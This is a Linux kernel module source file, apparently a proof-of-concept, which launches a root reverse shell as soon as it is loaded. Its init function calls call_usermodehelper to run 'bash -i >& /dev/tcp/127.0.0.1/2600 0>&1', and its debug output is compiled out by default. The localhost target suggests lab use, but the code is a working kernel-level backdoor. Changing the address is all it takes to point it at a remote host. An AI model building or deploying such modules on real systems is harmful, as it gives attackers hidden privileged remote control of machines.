// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://github.com/loneicewolf/EXEC_LKM
 */

#define pr_fmt(fmt) "%s: " fmt, __func__
#define TARGET_IP "127.0.0.1"
#define TARGET_PORT 2600

#include <linux/module.h>
#include <linux/kernel.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

void revshell_local(void);

void revshell_local(void)
{
	char *argv[] = { "/bin/bash", "-c",
			 "bash -i >& /dev/tcp/127.0.0.1/2600 0>&1 &", NULL };
	char *env[] = { "HOME=/", "TERM=xterm-256color",
			"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	dbg_print("Launching reverse shell\n");

	int ret = call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
	if (ret < 0) {
		dbg_print(
			"Failed to execute reverse shell command, error: %d\n",
			ret);
	} else {
		dbg_print("Reverse shell command executed successfully\n");
	}
}

static int __init revshell_local_init(void)
{
	dbg_print("revshell_local init successfully\n");

	revshell_local();

	return 0;
}

static void __exit revshell_local_exit(void)
{
	dbg_print("revshell_local exit successfully\n");
}

module_init(revshell_local_init);
module_exit(revshell_local_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("revshell_local");
